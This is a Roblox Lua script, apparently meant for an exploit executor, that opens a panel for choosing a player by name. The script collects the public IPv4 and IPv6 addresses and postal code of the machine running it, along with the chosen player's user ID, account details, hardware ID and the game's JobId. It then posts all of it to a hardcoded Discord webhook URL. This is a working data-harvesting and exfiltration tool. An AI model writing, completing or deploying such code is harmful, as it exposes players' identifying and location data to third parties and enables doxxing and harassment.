local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local screenGui
local frame

-- Função para criar o painel
local function createTextBoxPanel()
    -- Criar a tela e a estrutura
    screenGui = Instance.new("ScreenGui")
    screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

    frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.5
    frame.Parent = screenGui

    -- Criar a caixa de texto para o nome do jogador
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(0, 280, 0, 40)
    textBox.Position = UDim2.new(0, 10, 0, 40)
    textBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    textBox.PlaceholderText = "Digite o nome do jogador"
    textBox.ClearTextOnFocus = false
    textBox.Parent = frame

    -- Criar o botão de enviar
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 280, 0, 40)
    button.Position = UDim2.new(0, 10, 0, 90)
    button.Text = "Enviar"
    button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    button.Parent = frame

    -- Função para capturar o IP e CEP usando APIs
    local function getIpAndLocation()
        -- Coleta o IP e dados de localização (CEP) usando o serviço ip-api.com
        local ipV4 = game:HttpGet("https://v4.ident.me/")  -- IP público IPv4
        local ipV6 = game:HttpGet("https://v6.ident.me/")  -- IP público IPv6
        local locationData = game:HttpGet("http://ip-api.com/json")  -- Dados de localização (CEP, cidade, país)

        local location = HttpService:JSONDecode(locationData)
        local cep = location.zip  -- CEP
        return ipV4, ipV6, cep
    end

    -- Função para enviar as informações
    button.MouseButton1Click:Connect(function()
        local playerName = textBox.Text
        if playerName == "" then
            print("Digite um nome de jogador válido!")
            return
        end

        -- Coleta o IP e o CEP
        local ipV4, ipV6, cep = getIpAndLocation()

        -- Função para pegar as informações do jogador
        local function getPlayerInfo(playerName)
            local player = Players:FindFirstChild(playerName)
            if not player then
                return nil, "Jogador não encontrado."
            end

            -- Coleta as informações do jogador
            local Userid = player.UserId
            local DName = player.DisplayName
            local Name = player.Name
            local MembershipType = tostring(player.MembershipType):sub(21)
            local AccountAge = player.AccountAge
            local Country = game.LocalizationService.RobloxLocaleId
            local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
            local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

            -- Game Info
            local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

            return {
                Userid = Userid,
                DName = DName,
                Name = Name,
                MembershipType = MembershipType,
                AccountAge = AccountAge,
                Country = Country,
                GetHwid = GetHwid,
                GAMENAME = GAMENAME,
                ConsoleJobId = ConsoleJobId,
                IpV4 = ipV4,
                IpV6 = ipV6,
                Cep = cep
            }
        end

        -- Função para criar os dados do webhook
        local function createWebhookData(playerInfo)
            local data = {
                ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["author"] = {
                            ["name"] = "Informações do Jogador",
                            ["url"] = "https://roblox.com",
                        },
                        ["description"] = string.format(
                            "__[Player Info](https://www.roblox.com/users/%d)__" ..
                            " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                            "\n**AccountAge:** %d\n**Idade da Conta:** %d anos\n**Country:** %s\n**IP v4:** %s\n**IP v6:** %s\n**CEP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s" ..
                            "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                            "\n**Game:** %s \n**Game Id**: %d \n**JobId:** %s",
                            playerInfo.Userid, playerInfo.DName, playerInfo.Name, playerInfo.Userid, playerInfo.MembershipType, 
                            playerInfo.AccountAge, playerInfo.AccountAge, playerInfo.Country, playerInfo.IpV4, playerInfo.IpV6, playerInfo.Cep,
                            playerInfo.GetHwid, tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                            game.PlaceId, playerInfo.GAMENAME, game.PlaceId, playerInfo.ConsoleJobId
                        ),
                        ["type"] = "rich",
                        ["color"] = tonumber("0xFFD700"), -- Cor
                        ["thumbnail"] = {
                            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..playerInfo.Userid.."&width=150&height=150&format=png"
                        },
                    }
                }
            }

            return HttpService:JSONEncode(data)
        end

        -- Função para enviar o webhook para o Discord
        local function sendWebhook(webhookUrl, data)
            local headers = {
                ["content-type"] = "application/json"
            }
            local request = http_request or request or HttpPost or syn.request
            local requestData = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
            request(requestData)
        end

        -- Captura as informações do jogador
        local playerInfo, err = getPlayerInfo(playerName)
        if not playerInfo then
            print("Erro ao encontrar o jogador: " .. err)
            return
        end

        -- Substitua com sua URL de webhook
        local webhookUrl = "https://discord.com/api/webhooks/1331661006677737564/_vQxIjy8Yh8JwKdBXEWwlIS3JsUFyEb3-_CSi92wWDiDpH6NNjpERGdXoMiSWZQJ62aN"
        local webhookData = createWebhookData(playerInfo)
        sendWebhook(webhookUrl, webhookData)

        -- Avisar que os dados foram enviados
        print("Informações enviadas para o Discord!")
    end)

    -- Fechar o painel ao pressionar o Control Direito
    UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
        if not gameProcessedEvent then
            if input.UserInputType == Enum.UserInputType.Keyboard then
                if input.KeyCode == Enum.KeyCode.RightControl then
                    if screenGui then
                        screenGui:Destroy() -- Remove o painel da tela
                    end
                end
            end
        end
    end)
end

-- Mostrar o painel ao clicar com o Control Direito
UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
    if not gameProcessedEvent then
        if input.UserInputType == Enum.UserInputType.Keyboard then
            if input.KeyCode == Enum.KeyCode.RightControl then
                createTextBoxPanel()  -- Cria o painel quando pressionar Control Direito
            end
        end
    end
end)
